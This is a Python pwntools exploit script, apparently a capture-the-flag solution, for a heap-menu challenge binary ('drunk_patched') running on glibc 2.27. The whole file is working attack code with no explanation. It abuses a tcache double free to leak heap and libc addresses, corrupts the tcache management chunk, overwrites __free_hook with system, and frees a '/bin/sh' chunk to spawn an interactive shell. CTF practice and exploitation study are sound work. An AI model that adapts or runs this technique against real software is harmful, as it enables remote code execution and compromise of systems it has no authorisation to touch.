from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc-2.27.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./drunk_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def add(size, content):
    sla(b'-->>>> \n', b'1')
    sla(b'cup:\n', str(size).encode())
    sla(b'add?\n', content)

def delete(idx):
    sla(b'-->>>> \n', b'2')
    sla(b'number: \n', str(idx).encode())

def edit(idx, content):
    sla(b'-->>>> \n', b'4')
    sla(b'cup:\n', str(idx).encode())
    sla(b'refill\n', content)

def show(idx):
    sla(b'-->>>> \n', b'3')
    sla(b'left: \n', str(idx).encode())

def wow():
    sla(b'-->>>> \n', b'888')

debug('''
    b *$rebase(0xba3)
    b *$rebase(0xcea)
    b *$rebase(0xde4)
    b *$rebase(0xea1)
    b *$rebase(0xf46)
''')

add(0x40, b'a' * 0x40)
add(0x40, b'a' * 0x40)
delete(0)
delete(0)
show(0)

heap_addr = u64(ru(b'\x0a')[-7:-1].ljust(8, b'\x00')) - 0x260
pr('heap_addr', heap_addr)
add(0x40, p64(heap_addr + 0x10))
add(0x40, b'a' * 0x40)
add(0x40, b'\x00' * 0x10 + b'\x07' * 30)
delete(4)
show(4)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x3ebca0
pr('libc_base', libc_base)
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

edit(4, b'\x00' * 0x40)
delete(0)
delete(0)
add(0x40, p64(free_hook))
add(0x40, b'/bin/sh\x00')
add(0x40, p64(system))
delete(6)

shell()
